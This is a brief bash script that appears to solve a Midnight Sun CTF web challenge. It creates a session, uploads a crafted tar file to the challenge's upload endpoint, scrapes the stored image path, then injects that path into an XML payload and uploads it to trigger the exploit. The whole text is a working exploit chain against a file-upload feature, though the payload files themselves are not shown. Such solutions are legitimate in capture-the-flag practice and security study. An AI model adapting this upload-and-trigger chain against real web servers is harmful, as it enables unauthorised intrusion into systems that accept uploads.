#!/usr/bin/env bash
php exploit.php
id=$(uuidgen)
curl -X POST http://ruben-01.play.midnightsunctf.se:8080/upload.php --form "image=@exploit.tar" -b "PHPSESSID=$id"
img=$(curl http://ruben-01.play.midnightsunctf.se:8080/index.php -b "PHPSESSID=$id" | grep -o "images/[^'_]*.jpg")
sed -e "s@PAYLOAD@$img@" exploit.xml | curl -X POST http://ruben-01.play.midnightsunctf.se:8080/upload.php --form "image=@-" -b "PHPSESSID=$id"
